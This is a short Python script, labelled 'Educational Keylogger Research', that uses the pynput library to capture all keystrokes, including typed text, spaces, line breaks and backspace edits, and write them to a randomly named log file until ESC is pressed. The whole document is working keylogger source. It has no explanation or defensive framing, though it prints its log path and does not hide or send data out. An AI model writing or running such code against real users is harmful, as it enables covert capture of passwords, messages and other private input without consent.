import random
import string
import os
from pynput import keyboard

# Generate a random filename
def generate_random_filename(extension=".txt", length=8):
    letters = string.ascii_letters
    random_filename = ''.join(random.choice(letters) for _ in range(length)) + extension
    return random_filename

# Define the log file path
log_file_path = generate_random_filename()

def on_press(key):
    try:
        # Open file in append mode for each keystroke
        with open(log_file_path, 'a', encoding='utf-8') as log_file:
            if hasattr(key, 'char') and key.char:
                log_file.write(key.char)
                log_file.flush()  # Force write to disk
            elif key == keyboard.Key.space:
                log_file.write(' ')
                log_file.flush()
            elif key == keyboard.Key.enter:
                log_file.write('\n')
                log_file.flush()
            elif key == keyboard.Key.backspace:
                # Handle backspace by reading the file, removing last char, and rewriting
                log_file.close()  # Close the append mode file first
                
                # Read current content
                with open(log_file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Remove last character if exists
                if content:
                    content = content[:-1]
                
                # Write back the modified content
                with open(log_file_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                    
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        print(f"Exiting... Log file: {log_file_path}")
        return False

# Create initial file
with open(log_file_path, 'w', encoding='utf-8') as log_file:
    log_file.write("Educational Keylogger Research - Keystroke Log\n")
    log_file.write("=" * 50 + "\n")

print(f"Logging keystrokes to: {log_file_path}")
print("Press ESC to stop logging...")

# Start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
